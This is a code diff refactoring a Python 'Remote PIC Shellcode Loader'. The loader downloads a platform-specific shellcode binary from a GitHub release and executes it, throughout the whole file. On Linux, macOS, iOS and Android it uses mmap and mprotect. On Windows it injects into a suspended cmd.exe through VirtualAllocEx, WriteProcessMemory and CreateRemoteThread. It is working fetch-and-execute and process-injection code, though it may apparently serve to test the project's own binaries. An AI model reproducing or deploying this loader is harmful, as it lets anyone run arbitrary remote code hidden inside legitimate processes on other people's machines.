@@ -22,9 +22,11 @@ import urllib.request
 
 REPO = "mrzaxaryan/Position-Independent-Runtime"
 
-# --- Host detection ---
+# =============================================================================
+# Host Detection
+# =============================================================================
 
-_HOST_FAMILIES = [
+_MACHINE_ALIASES = [
     (('amd64', 'x86_64', 'i86pc'), 'x86',   64),
     (('arm64', 'aarch64'),          'arm',   64),
     (('i386', 'i686', 'x86'),       'x86',   32),
@@ -34,20 +36,22 @@ _HOST_FAMILIES = [
     (('mips64',),                   'mips',  64),
 ]
 
-# Map (os_name, family, bits) -> (platform_name, arch_name)
-_HOST_TO_ARTIFACT = {
+# (os, family, bits) -> (platform_name, arch_name)
+_ARTIFACT_MAP = {
     ('linux',   'x86',   64): ('linux',   'x86_64'),
     ('linux',   'x86',   32): ('linux',   'i386'),
     ('linux',   'arm',   64): ('linux',   'aarch64'),
     ('linux',   'arm',   32): ('linux',   'armv7a'),
     ('linux',   'riscv', 64): ('linux',   'riscv64'),
     ('linux',   'riscv', 32): ('linux',   'riscv32'),
+    ('linux',   'mips',  64): ('linux',   'mips64'),
     ('windows', 'x86',   64): ('windows', 'x86_64'),
     ('windows', 'x86',   32): ('windows', 'i386'),
     ('windows', 'arm',   64): ('windows', 'aarch64'),
     ('windows', 'arm',   32): ('windows', 'armv7a'),
     ('darwin',  'x86',   64): ('macos',   'x86_64'),
     ('darwin',  'arm',   64): ('macos',   'aarch64'),
+    ('ios',     'arm',   64): ('ios',     'aarch64'),
     ('freebsd', 'x86',   64): ('freebsd', 'x86_64'),
     ('freebsd', 'x86',   32): ('freebsd', 'i386'),
     ('freebsd', 'arm',   64): ('freebsd', 'aarch64'),
@@ -55,90 +59,109 @@ _HOST_TO_ARTIFACT = {
     ('sunos',   'x86',   64): ('solaris', 'x86_64'),
     ('sunos',   'x86',   32): ('solaris', 'i386'),
     ('sunos',   'arm',   64): ('solaris', 'aarch64'),
-    ('linux',   'mips',  64): ('linux',   'mips64'),
     ('android', 'arm',   64): ('android', 'aarch64'),
     ('android', 'arm',   32): ('android', 'armv7a'),
     ('android', 'x86',   64): ('android', 'x86_64'),
-    ('android', 'x86',   32): ('android', 'i386'),
 }
 
 
-def _is_android():
-    try:
-        with open('/system/build.prop') as _:
-            return True
-    except (OSError, IOError):
-        pass
-    return 'ANDROID_ROOT' in os.environ
+def _detect_os():
+    """Detect the OS, distinguishing iOS and Android from their parent kernels."""
+    # Python 3.13+ native iOS detection
+    if sys.platform == 'ios':
+        return 'ios'
+    os_name = platform.system().lower()
+    # Android runs on Linux kernel
+    if os_name == 'linux':
+        if 'ANDROID_ROOT' in os.environ:
+            return 'android'
+        try:
+            with open('/system/build.prop'):
+                return 'android'
+        except OSError:
+            pass
+    # iOS (jailbroken, pre-3.13 Python) runs on Darwin
+    if os_name == 'darwin':
+        if os.path.isdir('/var/mobile') or os.path.exists('/usr/lib/libMobileGestalt.dylib'):
+            return 'ios'
+    return os_name
+
+
+def _detect_arch():
+    """Detect the CPU family and bitness from platform.machine()."""
+    machine = platform.machine().lower()
+    for aliases, family, bits in _MACHINE_ALIASES:
+        if machine in aliases:
+            return family, bits
+    return machine, 64
 
 
 def get_host():
-    os_name = platform.system().lower()
-    if os_name == 'linux' and _is_android():
-        os_name = 'android'
-    machine = platform.machine().lower()
-    for aliases, family, bits in _HOST_FAMILIES:
-        if machine in aliases:
-            return os_name, family, bits
-    return os_name, machine, 64
+    """Returns (os_name, family, bits) for the current host."""
+    return _detect_os(), *_detect_arch()
 
 
-# --- Execution ---
+# =============================================================================
+# Execution — POSIX (mmap + mprotect)
+# =============================================================================
 
 def _flush_icache(addr, size):
+    """Flush instruction cache on ARM64 Darwin (macOS/iOS)."""
     machine = platform.machine().lower()
     if machine not in ('arm64', 'aarch64'):
         return
-    libc = ctypes.CDLL(None)
-    if platform.system().lower() == 'darwin':
+    os_name = platform.system().lower()
+    if os_name == 'darwin' or sys.platform == 'ios':
+        libc = ctypes.CDLL(None)
         libc.sys_icache_invalidate.argtypes = [ctypes.c_void_p, ctypes.c_size_t]
         libc.sys_icache_invalidate.restype = None
         libc.sys_icache_invalidate(ctypes.c_void_p(addr), ctypes.c_size_t(size))
 
 
 def run_mmap(shellcode):
+    """Map shellcode RW, flip to RX via mprotect, execute."""
     mem = mmap.mmap(-1, len(shellcode), prot=mmap.PROT_READ | mmap.PROT_WRITE)
     mem.write(shellcode)
     addr = ctypes.addressof(ctypes.c_char.from_buffer(mem))
+
     libc = ctypes.CDLL(None)
     page_size = os.sysconf('SC_PAGE_SIZE')
     aligned = addr & ~(page_size - 1)
-    size = len(shellcode) + (addr - aligned)
-    if libc.mprotect(ctypes.c_void_p(aligned), ctypes.c_size_t(size), mmap.PROT_READ | mmap.PROT_EXEC) != 0:
+    total = len(shellcode) + (addr - aligned)
+    if libc.mprotect(ctypes.c_void_p(aligned), ctypes.c_size_t(total),
+                     mmap.PROT_READ | mmap.PROT_EXEC) != 0:
         raise OSError("mprotect failed")
+
     _flush_icache(addr, len(shellcode))
 
     print(f"[+] Entry: 0x{addr:x}")
     print("[*] Executing...")
     sys.stdout.flush()
-
     return ctypes.CFUNCTYPE(ctypes.c_int)(addr)()
 
 
+# =============================================================================
+# Execution — Windows (process injection)
+# =============================================================================
+
 def run_injected(shellcode, target_arch):
-    """Run shellcode via process injection (Windows only)."""
+    """Run shellcode via suspended-process injection (Windows only)."""
     from ctypes import wintypes
 
-    MEM_COMMIT_RESERVE = 0x3000
-    PAGE_EXECUTE_READWRITE = 0x40
-    CREATE_SUSPENDED = 0x00000004
-    INFINITE = 0xFFFFFFFF
-
-    HOST_PROCESS = {
+    _HOST_PROCESS = {
         'i386':    r'C:\Windows\SysWOW64\cmd.exe',
         'x86_64':  r'C:\Windows\System32\cmd.exe',
         'armv7a':  r'C:\Windows\SysArm32\cmd.exe',
         'aarch64': r'C:\Windows\System32\cmd.exe',
     }
 
-    host_exe = HOST_PROCESS.get(target_arch)
+    host_exe = _HOST_PROCESS.get(target_arch)
     if not host_exe or not os.path.exists(host_exe):
         raise OSError(f"No suitable host process for {target_arch}")
 
     print(f"[+] Host process: {host_exe}")
 
     k32 = ctypes.windll.kernel32
-
     k32.VirtualAllocEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
     k32.VirtualAllocEx.restype = wintypes.LPVOID
     k32.WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
@@ -158,7 +181,7 @@ def run_injected(shellcode, target_arch):
     k32.CreateProcessW.argtypes = [
         wintypes.LPCWSTR, wintypes.LPWSTR, wintypes.LPVOID, wintypes.LPVOID,
         wintypes.BOOL, wintypes.DWORD, wintypes.LPVOID, wintypes.LPCWSTR,
-        wintypes.LPVOID, wintypes.LPVOID
+        wintypes.LPVOID, wintypes.LPVOID,
     ]
     k32.CreateProcessW.restype = wintypes.BOOL
 
@@ -186,20 +209,22 @@ def run_injected(shellcode, target_arch):
     si.cb = ctypes.sizeof(STARTUPINFOW)
     pi = PROCESS_INFORMATION()
 
-    if not k32.CreateProcessW(host_exe, None, None, None, False, CREATE_SUSPENDED, None, None, ctypes.byref(si), ctypes.byref(pi)):
+    if not k32.CreateProcessW(host_exe, None, None, None, False, 0x4, None, None,
+                              ctypes.byref(si), ctypes.byref(pi)):
         raise OSError(f"CreateProcessW failed: {k32.GetLastError()}")
 
     print(f"[+] Created process PID: {pi.dwProcessId}")
 
     try:
-        remote_mem = k32.VirtualAllocEx(pi.hProcess, None, len(shellcode), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
+        remote_mem = k32.VirtualAllocEx(pi.hProcess, None, len(shellcode), 0x3000, 0x40)
         if not remote_mem:
             raise OSError(f"VirtualAllocEx failed: {k32.GetLastError()}")
 
         print(f"[+] Remote memory: 0x{remote_mem:x}")
 
         written = ctypes.c_size_t()
-        if not k32.WriteProcessMemory(pi.hProcess, remote_mem, shellcode, len(shellcode), ctypes.byref(written)):
+        if not k32.WriteProcessMemory(pi.hProcess, remote_mem, shellcode,
+                                      len(shellcode), ctypes.byref(written)):
             raise OSError(f"WriteProcessMemory failed: {k32.GetLastError()}")
 
         print(f"[+] Written: {written.value} bytes")
@@ -207,32 +232,35 @@ def run_injected(shellcode, target_arch):
         print("[*] Executing...")
         sys.stdout.flush()
 
-        remote_thread = k32.CreateRemoteThread(pi.hProcess, None, 0, remote_mem, None, 0, None)
-        if not remote_thread:
+        thread = k32.CreateRemoteThread(pi.hProcess, None, 0, remote_mem, None, 0, None)
+        if not thread:
             raise OSError(f"CreateRemoteThread failed: {k32.GetLastError()}")
 
-        k32.WaitForSingleObject(remote_thread, INFINITE)
+        k32.WaitForSingleObject(thread, 0xFFFFFFFF)
 
         code = wintypes.DWORD()
-        k32.GetExitCodeThread(remote_thread, ctypes.byref(code))
-        k32.CloseHandle(remote_thread)
+        k32.GetExitCodeThread(thread, ctypes.byref(code))
+        k32.CloseHandle(thread)
         return code.value
-
     finally:
         k32.TerminateProcess(pi.hProcess, 0)
         k32.CloseHandle(pi.hThread)
         k32.CloseHandle(pi.hProcess)
 
 
-# --- Download ---
+# =============================================================================
+# Download
+# =============================================================================
 
-def http_get(url):
+def _http_get(url):
+    """GET request with a non-default User-Agent."""
     req = urllib.request.Request(url, headers={"User-Agent": "PIR-RemoteLoader/1.0"})
     with urllib.request.urlopen(req) as resp:
         return resp.read()
 
 
-def find_latest_tag():
+def _find_latest_tag():
+    """Query the GitHub API for the most recent release tag."""
     url = f"https://api.github.com/repos/{REPO}/releases?per_page=1"
     req = urllib.request.Request(url, headers={
         "User-Agent": "PIR-RemoteLoader/1.0",
@@ -245,9 +273,10 @@ def find_latest_tag():
     return releases[0]["tag_name"]
 
 
-def download_release_asset(platform_name, arch, tag):
+def download(platform_name, arch, tag):
+    """Download the .bin asset from a GitHub Release."""
     if not tag:
-        tag = find_latest_tag()
+        tag = _find_latest_tag()
         print(f"[+] Latest release: {tag}")
 
     asset = f"{platform_name}-{arch}.bin"
@@ -256,44 +285,37 @@ def download_release_asset(platform_name, arch, tag):
     print(f"[*] Downloading: {asset}")
     print(f"[*] URL: {url}")
     try:
-        return http_get(url)
+        return _http_get(url)
     except urllib.error.HTTPError as e:
         if e.code == 404:
-            sys.exit(
-                f"[-] Asset '{asset}' not found in release {tag}.\n"
-                f"    URL: {url}"
-            )
+            sys.exit(f"[-] Asset '{asset}' not found in release {tag}.\n    URL: {url}")
         raise
 
 
-# --- Entry point ---
+# =============================================================================
+# Entry Point
+# =============================================================================
 
 def main():
     parser = argparse.ArgumentParser(description='Remote PIC Shellcode Loader')
-    parser.add_argument('--tag', default=None,
-                        help='Release tag (default: latest)')
+    parser.add_argument('--tag', default=None, help='Release tag (default: latest)')
     args = parser.parse_args()
 
-    host_os, host_family, host_bits = get_host()
+    host_os, family, bits = get_host()
+    print(f"[*] Host: {host_os}/{family}/{bits}bit")
 
-    print(f"[*] Host: {host_os}/{host_family}/{host_bits}bit")
+    key = (host_os, family, bits)
+    if key not in _ARTIFACT_MAP:
+        sys.exit(f"[-] Unsupported host: {host_os}/{family}/{bits}bit")
 
-    host_key = (host_os, host_family, host_bits)
-    if host_key not in _HOST_TO_ARTIFACT:
-        sys.exit(f"[-] Unsupported host: {host_os}/{host_family}/{host_bits}bit")
-
-    platform_name, arch = _HOST_TO_ARTIFACT[host_key]
-
-    print(f"[*] Platform: {platform_name}/{arch}")
+    plat, arch = _ARTIFACT_MAP[key]
+    print(f"[*] Platform: {plat}/{arch}")
     print(f"[*] Release: {args.tag or 'latest'}")
 
-    shellcode = download_release_asset(platform_name, arch, args.tag)
+    shellcode = download(plat, arch, args.tag)
     print(f"[+] Loaded: {len(shellcode)} bytes")
 
-    if host_os == 'windows':
-        code = run_injected(shellcode, arch)
-    else:
-        code = run_mmap(shellcode)
+    code = run_injected(shellcode, arch) if host_os == 'windows' else run_mmap(shellcode)
 
     print(f"[+] Exit: {code}")
     os._exit(code)
